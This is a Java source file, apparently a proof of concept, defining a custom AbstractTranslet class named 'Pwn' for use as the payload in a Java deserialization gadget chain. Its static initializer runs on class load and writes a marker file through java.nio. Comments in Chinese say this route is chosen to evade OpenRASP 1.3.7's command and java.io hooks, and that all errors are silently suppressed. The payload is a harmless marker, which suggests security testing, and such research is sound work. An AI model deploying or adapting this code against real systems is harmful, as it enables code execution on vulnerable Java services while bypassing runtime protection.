import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

/** 定制 Translet：类初始化时走 java.nio 写 marker（绕 OpenRASP 1.3.7 命令/java.io hook）。
 *  marker 路径编译期由 -Dpwn.marker 注入。 */
public class Pwn extends AbstractTranslet {
    static {
        try {
            java.nio.file.Files.write(
                java.nio.file.Paths.get(System.getProperty("pwn.marker", "/tmp/pwn_rasp_nio")),
                "pwn".getBytes("UTF-8"));
        } catch (Throwable t) {
            // 静默：任何失败都不影响反序列化主流程
        }
    }

    public Pwn() {}

    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler[] h) {}

    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.dtm.DTMAxisIterator i,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler h) {}
}
